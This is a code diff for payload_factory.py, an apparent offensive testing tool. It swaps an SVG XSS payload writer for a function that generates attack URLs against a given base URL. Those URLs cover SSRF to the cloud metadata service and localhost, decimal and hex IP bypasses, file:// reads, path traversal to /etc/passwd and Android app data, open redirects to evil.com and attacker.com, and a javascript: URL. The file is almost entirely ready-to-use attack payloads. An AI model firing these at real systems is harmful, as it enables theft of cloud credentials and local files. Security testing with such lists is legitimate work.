@@ -1,10 +1,41 @@
-import os
+# payload_factory.py
 
-def generate():
-    print("\033[1;34m[*]\033[0m Generating bypass payloads...")
-    payload_path = "output/payloads/xss_bypass.svg"
-    os.makedirs("output/payloads", exist_ok=True)
-    with open(payload_path, "w") as f:
-        f.write('<svg onload="alert(\'B-XSSRF\')">')
-    print(f"\033[1;32m[+]\033[0m Payload ready at: {payload_path}")
-    return payload_path
+def generate_payloads(base_url):
+    """
+    توليد payloads لاختبار:
+    - SSRF
+    - Path Traversal
+    - Open Redirect
+    """
+
+    base = base_url.rstrip("/")
+
+    payloads = [
+
+        # SSRF
+        f"{base}?url=http://169.254.169.254/latest/meta-data/",
+        f"{base}?url=http://127.0.0.1:80",
+        f"{base}?url=http://localhost:8080",
+        f"{base}?url=http://10.0.2.2",
+
+        # SSRF bypass
+        f"{base}?url=http://2130706433",
+        f"{base}?url=http://0x7f000001",
+
+        # File access
+        f"{base}?file=file:///etc/hosts",
+        f"{base}?path=file:///data/data/",
+
+        # Path traversal
+        f"{base}?path=../../../../../../etc/passwd",
+        f"{base}?path=../../../../data/data/com.example/",
+
+        # Redirect
+        f"{base}?redirect=http://evil.com",
+        f"{base}?next=https://attacker.com",
+
+        # WebView abuse
+        f"{base}?url=javascript:alert(1)",
+    ]
+
+    return list(set(payloads))
